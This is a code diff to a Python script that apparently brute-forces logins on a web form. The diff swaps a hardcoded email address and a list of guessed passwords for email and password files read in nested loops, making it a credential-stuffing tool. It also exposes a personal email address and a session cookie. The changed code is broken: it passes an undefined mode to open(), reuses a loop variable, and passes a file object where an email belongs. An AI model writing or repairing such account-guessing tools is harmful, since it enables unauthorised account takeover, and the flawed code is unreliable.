@@ -9,10 +9,19 @@ HEADERS = {
 
 PAYLOAD = {}
 COOKIES = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
-EMAIL = 'moujanemarwane@gmail.com'
-PASS = ['fkgg', 'fkfkfldd', 'fflddkfk', 'marwane123', 'jddjhfhjd', 'fkfkdkd']
+EMAIL = open('email.txt', r)
+PASS = open('pass.txt', r)
+emails = []
+passwords = []
 deleted_item = ['email', 'pass', 'prefill_contact_point', 'prefill_source', 'prefill_type', 'first_prefill_source', 'first_prefill_type', 'had_cp_prefilled', 'had_password_prefilled', 'ab_test_data']
 
+for i in EMAIL:
+    emails.append(i)
+    
+for j in PASS:
+    passwords.append(j)
+    
+ 
 def create_form():
     data = requests.get(POST_URL, headers=HEADERS)
     for i in data.cookies:
@@ -39,8 +48,9 @@ def is_this_a_password(email, password):
 
 if __name__ == "__main__":
     create_form()
-    for i in PASS:
-        is_this_a_password(EMAIL, i)
+    for i in emails:
+        for i in passwords:
+            is_this_a_password(EMAIL, i)
 
 
     
